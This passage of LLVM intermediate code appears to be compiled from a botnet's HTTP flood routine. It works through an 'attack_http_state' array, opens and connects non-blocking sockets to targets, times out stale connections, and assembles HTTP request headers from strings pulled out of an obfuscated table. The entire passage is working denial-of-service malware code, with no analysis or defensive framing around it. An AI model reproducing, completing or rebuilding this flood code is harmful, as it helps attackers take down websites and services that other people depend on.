  %416 = call i8* @table_retrieve_val(i32 noundef 85, i32* noundef null)
  %417 = call i32 @util_strcpy(i8* noundef %415, i8* noundef %416)
  call void @table_lock_val(i8 noundef zeroext 85)
  br label %427

418:                                              ; preds = %289
  call void @table_unlock_val(i8 noundef zeroext 86)
  %419 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %420 = load i32, i32* %9, align 4
  %421 = sext i32 %420 to i64
  %422 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %419, i64 %421
  %423 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %422, i32 0, i32 5
  %424 = getelementptr inbounds [512 x i8], [512 x i8]* %423, i64 0, i64 0
  %425 = call i8* @table_retrieve_val(i32 noundef 86, i32* noundef null)
  %426 = call i32 @util_strcpy(i8* noundef %424, i8* noundef %425)
  call void @table_lock_val(i8 noundef zeroext 86)
  br label %427

427:                                              ; preds = %418, %409, %400, %391, %382, %373, %364, %355, %346, %337, %328, %319, %310, %301, %292, %289
  %428 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %429 = load i32, i32* %9, align 4
  %430 = sext i32 %429 to i64
  %431 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %428, i64 %430
  %432 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %431, i32 0, i32 6
  %433 = getelementptr inbounds [257 x i8], [257 x i8]* %432, i64 0, i64 0
  %434 = load i8*, i8** %17, align 8
  %435 = call i32 @util_strcpy(i8* noundef %433, i8* noundef %434)
  br label %436

436:                                              ; preds = %427
  %437 = load i32, i32* %9, align 4
  %438 = add nsw i32 %437, 1
  store i32 %438, i32* %9, align 4
  br label %149, !llvm.loop !8

439:                                              ; preds = %149
  br label %440

440:                                              ; preds = %2546, %1062, %1052, %439
  store i32 0, i32* %23, align 4
  %441 = call i64 @time(i64* noundef null) #6
  %442 = trunc i64 %441 to i32
  store i32 %442, i32* %27, align 4
  br label %443

443:                                              ; preds = %440
  store %struct.fd_set* %21, %struct.fd_set** %29, align 8
  store i32 0, i32* %28, align 4
  br label %444

444:                                              ; preds = %454, %443
  %445 = load i32, i32* %28, align 4
  %446 = zext i32 %445 to i64
  %447 = icmp ult i64 %446, 16
  br i1 %447, label %448, label %457

448:                                              ; preds = %444
  %449 = load %struct.fd_set*, %struct.fd_set** %29, align 8
  %450 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %449, i32 0, i32 0
  %451 = load i32, i32* %28, align 4
  %452 = zext i32 %451 to i64
  %453 = getelementptr inbounds [16 x i64], [16 x i64]* %450, i64 0, i64 %452
  store i64 0, i64* %453, align 8
  br label %454

454:                                              ; preds = %448
  %455 = load i32, i32* %28, align 4
  %456 = add i32 %455, 1
  store i32 %456, i32* %28, align 4
  br label %444, !llvm.loop !9

457:                                              ; preds = %444
  br label %458

458:                                              ; preds = %457
  br label %459

459:                                              ; preds = %458
  store %struct.fd_set* %22, %struct.fd_set** %31, align 8
  store i32 0, i32* %30, align 4
  br label %460

460:                                              ; preds = %470, %459
  %461 = load i32, i32* %30, align 4
  %462 = zext i32 %461 to i64
  %463 = icmp ult i64 %462, 16
  br i1 %463, label %464, label %473

464:                                              ; preds = %460
  %465 = load %struct.fd_set*, %struct.fd_set** %31, align 8
  %466 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %465, i32 0, i32 0
  %467 = load i32, i32* %30, align 4
  %468 = zext i32 %467 to i64
  %469 = getelementptr inbounds [16 x i64], [16 x i64]* %466, i64 0, i64 %468
  store i64 0, i64* %469, align 8
  br label %470

470:                                              ; preds = %464
  %471 = load i32, i32* %30, align 4
  %472 = add i32 %471, 1
  store i32 %472, i32* %30, align 4
  br label %460, !llvm.loop !10

473:                                              ; preds = %460
  br label %474

474:                                              ; preds = %473
  store i32 0, i32* %9, align 4
  br label %475

475:                                              ; preds = %1046, %474
  %476 = load i32, i32* %9, align 4
  %477 = load i32, i32* %18, align 4
  %478 = icmp slt i32 %476, %477
  br i1 %478, label %479, label %1049

479:                                              ; preds = %475
  %480 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %481 = load i32, i32* %9, align 4
  %482 = sext i32 %481 to i64
  %483 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %480, i64 %482
  store %struct.attack_http_state* %483, %struct.attack_http_state** %26, align 8
  %484 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %485 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %484, i32 0, i32 1
  %486 = load i8, i8* %485, align 4
  %487 = zext i8 %486 to i32
  %488 = icmp eq i32 %487, 1
  br i1 %488, label %489, label %501

489:                                              ; preds = %479
  %490 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %491 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %490, i32 0, i32 12
  %492 = load i32, i32* %491, align 4
  %493 = icmp ne i32 %492, 0
  br i1 %493, label %494, label %497

494:                                              ; preds = %489
  %495 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %496 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %495, i32 0, i32 1
  store i8 4, i8* %496, align 4
  br label %500

497:                                              ; preds = %489
  %498 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %499 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %498, i32 0, i32 1
  store i8 0, i8* %499, align 4
  br label %500

500:                                              ; preds = %497, %494
  br label %501

501:                                              ; preds = %500, %479
  %502 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %503 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %502, i32 0, i32 1
  %504 = load i8, i8* %503, align 4
  %505 = zext i8 %504 to i32
  %506 = icmp eq i32 %505, 0
  br i1 %506, label %507, label %587

507:                                              ; preds = %501
  %508 = bitcast %struct.sockaddr_in* %32 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %508, i8 0, i64 16, i1 false)
  %509 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %510 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %509, i32 0, i32 0
  %511 = load i32, i32* %510, align 4
  %512 = icmp ne i32 %511, -1
  br i1 %512, label %513, label %518

513:                                              ; preds = %507
  %514 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %515 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %514, i32 0, i32 0
  %516 = load i32, i32* %515, align 4
  %517 = call i32 @close(i32 noundef %516)
  br label %518

518:                                              ; preds = %513, %507
  %519 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #6
  %520 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %521 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %520, i32 0, i32 0
  store i32 %519, i32* %521, align 4
  %522 = icmp eq i32 %519, -1
  br i1 %522, label %523, label %524

523:                                              ; preds = %518
  br label %1046

524:                                              ; preds = %518
  %525 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %526 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %525, i32 0, i32 0
  %527 = load i32, i32* %526, align 4
  %528 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %529 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %528, i32 0, i32 0
  %530 = load i32, i32* %529, align 4
  %531 = call i32 (i32, i32, ...) @fcntl(i32 noundef %530, i32 noundef 3, i32 noundef 0)
  %532 = or i32 2048, %531
  %533 = call i32 (i32, i32, ...) @fcntl(i32 noundef %527, i32 noundef 4, i32 noundef %532)
  store i32 65535, i32* %10, align 4
  %534 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %535 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %534, i32 0, i32 0
  %536 = load i32, i32* %535, align 4
  %537 = bitcast i32* %10 to i8*
  %538 = call i32 @setsockopt(i32 noundef %536, i32 noundef 0, i32 noundef 8, i8* noundef %537, i32 noundef 4) #6
  %539 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 0
  store i16 2, i16* %539, align 4
  %540 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %541 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %540, i32 0, i32 4
  %542 = load i32, i32* %541, align 4
  %543 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 2
  %544 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %543, i32 0, i32 0
  store i32 %542, i32* %544, align 4
  %545 = load i16, i16* %19, align 2
  %546 = call zeroext i16 @htons(i16 noundef zeroext %545) #7
  %547 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 1
  store i16 %546, i16* %547, align 2
  %548 = load i32, i32* %27, align 4
  %549 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %550 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %549, i32 0, i32 2
  store i32 %548, i32* %550, align 4
  %551 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %552 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %551, i32 0, i32 1
  store i8 2, i8* %552, align 4
  %553 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %554 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %553, i32 0, i32 0
  %555 = load i32, i32* %554, align 4
  %556 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %557 = bitcast %struct.sockaddr_in* %32 to %struct.sockaddr*
  store %struct.sockaddr* %557, %struct.sockaddr** %556, align 8
  %558 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %559 = load %struct.sockaddr*, %struct.sockaddr** %558, align 8
  %560 = call i32 @connect(i32 noundef %555, %struct.sockaddr* %559, i32 noundef 16)
  %561 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %562 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %561, i32 0, i32 0
  %563 = load i32, i32* %562, align 4
  %564 = srem i32 %563, 64
  %565 = zext i32 %564 to i64
  %566 = shl i64 1, %565
  %567 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %568 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %569 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %568, i32 0, i32 0
  %570 = load i32, i32* %569, align 4
  %571 = sdiv i32 %570, 64
  %572 = sext i32 %571 to i64
  %573 = getelementptr inbounds [16 x i64], [16 x i64]* %567, i64 0, i64 %572
  %574 = load i64, i64* %573, align 8
  %575 = or i64 %574, %566
  store i64 %575, i64* %573, align 8
  %576 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %577 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %576, i32 0, i32 0
  %578 = load i32, i32* %577, align 4
  %579 = load i32, i32* %23, align 4
  %580 = icmp sgt i32 %578, %579
  br i1 %580, label %581, label %586

581:                                              ; preds = %524
  %582 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %583 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %582, i32 0, i32 0
  %584 = load i32, i32* %583, align 4
  %585 = add nsw i32 %584, 1
  store i32 %585, i32* %23, align 4
  br label %586

586:                                              ; preds = %581, %524
  br label %1045

587:                                              ; preds = %501
  %588 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %589 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %588, i32 0, i32 1
  %590 = load i8, i8* %589, align 4
  %591 = zext i8 %590 to i32
  %592 = icmp eq i32 %591, 2
  br i1 %592, label %593, label %636

593:                                              ; preds = %587
  %594 = load i32, i32* %27, align 4
  %595 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %596 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %595, i32 0, i32 2
  %597 = load i32, i32* %596, align 4
  %598 = sub i32 %594, %597
  %599 = icmp ugt i32 %598, 30
  br i1 %599, label %600, label %609

600:                                              ; preds = %593
  %601 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %602 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %601, i32 0, i32 1
  store i8 0, i8* %602, align 4
  %603 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %604 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %603, i32 0, i32 0
  %605 = load i32, i32* %604, align 4
  %606 = call i32 @close(i32 noundef %605)
  %607 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %608 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %607, i32 0, i32 0
  store i32 -1, i32* %608, align 4
  br label %1046

609:                                              ; preds = %593
  %610 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %611 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %610, i32 0, i32 0
  %612 = load i32, i32* %611, align 4
  %613 = srem i32 %612, 64
  %614 = zext i32 %613 to i64
  %615 = shl i64 1, %614
  %616 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %617 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %618 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %617, i32 0, i32 0
  %619 = load i32, i32* %618, align 4
  %620 = sdiv i32 %619, 64
  %621 = sext i32 %620 to i64
  %622 = getelementptr inbounds [16 x i64], [16 x i64]* %616, i64 0, i64 %621
  %623 = load i64, i64* %622, align 8
  %624 = or i64 %623, %615
  store i64 %624, i64* %622, align 8
  %625 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %626 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %625, i32 0, i32 0
  %627 = load i32, i32* %626, align 4
  %628 = load i32, i32* %23, align 4
  %629 = icmp sgt i32 %627, %628
  br i1 %629, label %630, label %635

630:                                              ; preds = %609
  %631 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %632 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %631, i32 0, i32 0
  %633 = load i32, i32* %632, align 4
  %634 = add nsw i32 %633, 1
  store i32 %634, i32* %23, align 4
  br label %635

635:                                              ; preds = %630, %609
  br label %1044

636:                                              ; preds = %587
  %637 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %638 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %637, i32 0, i32 1
  %639 = load i8, i8* %638, align 4
  %640 = zext i8 %639 to i32
  %641 = icmp eq i32 %640, 4
  br i1 %641, label %642, label %916

642:                                              ; preds = %636
  %643 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %644 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %643, i32 0, i32 14
  store i32 -1, i32* %644, align 4
  %645 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %646 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %645, i32 0, i32 11
  store i32 0, i32* %646, align 4
  %647 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %648 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %647, i32 0, i32 18
  %649 = getelementptr inbounds [1024 x i8], [1024 x i8]* %648, i64 0, i64 0
  call void @util_zero(i8* noundef %649, i32 noundef 1024)
  %650 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %651 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %650, i32 0, i32 17
  store i32 0, i32* %651, align 4
  %652 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  call void @util_zero(i8* noundef %652, i32 noundef 10240)
  %653 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %654 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %655 = call i32 @util_strlen(i8* noundef %654)
  %656 = sext i32 %655 to i64
  %657 = getelementptr inbounds i8, i8* %653, i64 %656
  %658 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %659 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %658, i32 0, i32 9
  %660 = getelementptr inbounds [9 x i8], [9 x i8]* %659, i64 0, i64 0
  %661 = call i32 @util_strcpy(i8* noundef %657, i8* noundef %660)
  %662 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %663 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %664 = call i32 @util_strlen(i8* noundef %663)
  %665 = sext i32 %664 to i64
  %666 = getelementptr inbounds i8, i8* %662, i64 %665
  %667 = call i32 @util_strcpy(i8* noundef %666, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  %668 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %669 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %670 = call i32 @util_strlen(i8* noundef %669)
  %671 = sext i32 %670 to i64
  %672 = getelementptr inbounds i8, i8* %668, i64 %671
  %673 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %674 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %673, i32 0, i32 6
  %675 = getelementptr inbounds [257 x i8], [257 x i8]* %674, i64 0, i64 0
  %676 = call i32 @util_strcpy(i8* noundef %672, i8* noundef %675)
  %677 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %678 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %679 = call i32 @util_strlen(i8* noundef %678)
  %680 = sext i32 %679 to i64
  %681 = getelementptr inbounds i8, i8* %677, i64 %680
  %682 = call i32 @util_strcpy(i8* noundef %681, i8* noundef getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0))
  %683 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %684 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %685 = call i32 @util_strlen(i8* noundef %684)
  %686 = sext i32 %685 to i64
  %687 = getelementptr inbounds i8, i8* %683, i64 %686
  %688 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %689 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %688, i32 0, i32 5
  %690 = getelementptr inbounds [512 x i8], [512 x i8]* %689, i64 0, i64 0
  %691 = call i32 @util_strcpy(i8* noundef %687, i8* noundef %690)
  %692 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %693 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %694 = call i32 @util_strlen(i8* noundef %693)
  %695 = sext i32 %694 to i64
  %696 = getelementptr inbounds i8, i8* %692, i64 %695
  %697 = call i32 @util_strcpy(i8* noundef %696, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0))
  %698 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %699 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %700 = call i32 @util_strlen(i8* noundef %699)
  %701 = sext i32 %700 to i64
  %702 = getelementptr inbounds i8, i8* %698, i64 %701
  %703 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %704 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %703, i32 0, i32 7
  %705 = getelementptr inbounds [129 x i8], [129 x i8]* %704, i64 0, i64 0
  %706 = call i32 @util_strcpy(i8* noundef %702, i8* noundef %705)
  %707 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %708 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %709 = call i32 @util_strlen(i8* noundef %708)
  %710 = sext i32 %709 to i64
  %711 = getelementptr inbounds i8, i8* %707, i64 %710
  %712 = call i32 @util_strcpy(i8* noundef %711, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  call void @table_unlock_val(i8 noundef zeroext 57)
  %713 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %714 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %715 = call i32 @util_strlen(i8* noundef %714)
  %716 = sext i32 %715 to i64
  %717 = getelementptr inbounds i8, i8* %713, i64 %716
  %718 = call i8* @table_retrieve_val(i32 noundef 57, i32* noundef null)
  %719 = call i32 @util_strcpy(i8* noundef %717, i8* noundef %718)
  call void @table_lock_val(i8 noundef zeroext 57)
  %720 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %721 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %722 = call i32 @util_strlen(i8* noundef %721)
  %723 = sext i32 %722 to i64
  %724 = getelementptr inbounds i8, i8* %720, i64 %723
  %725 = call i32 @util_strcpy(i8* noundef %724, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  call void @table_unlock_val(i8 noundef zeroext 58)
  %726 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %727 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %728 = call i32 @util_strlen(i8* noundef %727)
  %729 = sext i32 %728 to i64
  %730 = getelementptr inbounds i8, i8* %726, i64 %729
  %731 = call i8* @table_retrieve_val(i32 noundef 58, i32* noundef null)
  %732 = call i32 @util_strcpy(i8* noundef %730, i8* noundef %731)
  call void @table_lock_val(i8 noundef zeroext 58)
  %733 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %734 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %735 = call i32 @util_strlen(i8* noundef %734)
  %736 = sext i32 %735 to i64
  %737 = getelementptr inbounds i8, i8* %733, i64 %736
  %738 = call i32 @util_strcpy(i8* noundef %737, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  call void @table_unlock_val(i8 noundef zeroext 59)
  %739 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %740 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %741 = call i32 @util_strlen(i8* noundef %740)
  %742 = sext i32 %741 to i64
  %743 = getelementptr inbounds i8, i8* %739, i64 %742
  %744 = call i8* @table_retrieve_val(i32 noundef 59, i32* noundef null)
  %745 = call i32 @util_strcpy(i8* noundef %743, i8* noundef %744)
  call void @table_lock_val(i8 noundef zeroext 59)
  %746 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %747 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %748 = call i32 @util_strlen(i8* noundef %747)
  %749 = sext i32 %748 to i64
  %750 = getelementptr inbounds i8, i8* %746, i64 %749
  %751 = call i32 @util_strcpy(i8* noundef %750, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  %752 = load i8*, i8** %14, align 8
  %753 = icmp ne i8* %752, null
  br i1 %753, label %754, label %795

754:                                              ; preds = %642
  call void @table_unlock_val(i8 noundef zeroext 60)
  %755 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %756 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %757 = call i32 @util_strlen(i8* noundef %756)
  %758 = sext i32 %757 to i64
  %759 = getelementptr inbounds i8, i8* %755, i64 %758
  %760 = call i8* @table_retrieve_val(i32 noundef 60, i32* noundef null)
  %761 = call i32 @util_strcpy(i8* noundef %759, i8* noundef %760)
  call void @table_lock_val(i8 noundef zeroext 60)
  %762 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %763 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %764 = call i32 @util_strlen(i8* noundef %763)
  %765 = sext i32 %764 to i64
  %766 = getelementptr inbounds i8, i8* %762, i64 %765
  %767 = call i32 @util_strcpy(i8* noundef %766, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  %768 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %769 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %770 = call i32 @util_strlen(i8* noundef %769)
  %771 = sext i32 %770 to i64
  %772 = getelementptr inbounds i8, i8* %768, i64 %771
  %773 = call i8* @table_retrieve_val(i32 noundef 65, i32* noundef null)
  %774 = call i32 @util_strcpy(i8* noundef %772, i8* noundef %773)
  %775 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %776 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %777 = call i32 @util_strlen(i8* noundef %776)
  %778 = sext i32 %777 to i64
  %779 = getelementptr inbounds i8, i8* %775, i64 %778
  %780 = call i32 @util_strcpy(i8* noundef %779, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  %781 = load i8*, i8** %14, align 8
  %782 = call i32 @util_strlen(i8* noundef %781)
  %783 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %784 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %785 = call i32 @util_strlen(i8* noundef %784)
  %786 = sext i32 %785 to i64
  %787 = getelementptr inbounds i8, i8* %783, i64 %786
  %788 = call i8* @util_itoa(i32 noundef %782, i32 noundef 10, i8* noundef %787)
  %789 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %790 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %791 = call i32 @util_strlen(i8* noundef %790)
  %792 = sext i32 %791 to i64
  %793 = getelementptr inbounds i8, i8* %789, i64 %792
  %794 = call i32 @util_strcpy(i8* noundef %793, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  br label %795

795:                                              ; preds = %754, %642
  %796 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %797 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %796, i32 0, i32 15
  %798 = load i32, i32* %797, align 4
  %799 = icmp sgt i32 %798, 0
  br i1 %799, label %800, label %842

800:                                              ; preds = %795
  %801 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %802 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %803 = call i32 @util_strlen(i8* noundef %802)
  %804 = sext i32 %803 to i64
  %805 = getelementptr inbounds i8, i8* %801, i64 %804
  %806 = call i32 @util_strcpy(i8* noundef %805, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0))
  store i32 0, i32* %10, align 4
  br label %807

807:                                              ; preds = %832, %800
  %808 = load i32, i32* %10, align 4
  %809 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %810 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %809, i32 0, i32 15
  %811 = load i32, i32* %810, align 4
  %812 = icmp slt i32 %808, %811
  br i1 %812, label %813, label %835

813:                                              ; preds = %807
  %814 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %815 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %816 = call i32 @util_strlen(i8* noundef %815)
  %817 = sext i32 %816 to i64
  %818 = getelementptr inbounds i8, i8* %814, i64 %817
  %819 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %820 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %819, i32 0, i32 16
  %821 = load i32, i32* %10, align 4
  %822 = sext i32 %821 to i64
  %823 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %820, i64 0, i64 %822
  %824 = getelementptr inbounds [128 x i8], [128 x i8]* %823, i64 0, i64 0
  %825 = call i32 @util_strcpy(i8* noundef %818, i8* noundef %824)
  %826 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %827 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %828 = call i32 @util_strlen(i8* noundef %827)
  %829 = sext i32 %828 to i64
  %830 = getelementptr inbounds i8, i8* %826, i64 %829
  %831 = call i32 @util_strcpy(i8* noundef %830, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0))
  br label %832

832:                                              ; preds = %813
  %833 = load i32, i32* %10, align 4
  %834 = add nsw i32 %833, 1
  store i32 %834, i32* %10, align 4
  br label %807, !llvm.loop !11

835:                                              ; preds = %807
  %836 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %837 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %838 = call i32 @util_strlen(i8* noundef %837)
  %839 = sext i32 %838 to i64
  %840 = getelementptr inbounds i8, i8* %836, i64 %839
  %841 = call i32 @util_strcpy(i8* noundef %840, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  br label %842

842:                                              ; preds = %835, %795
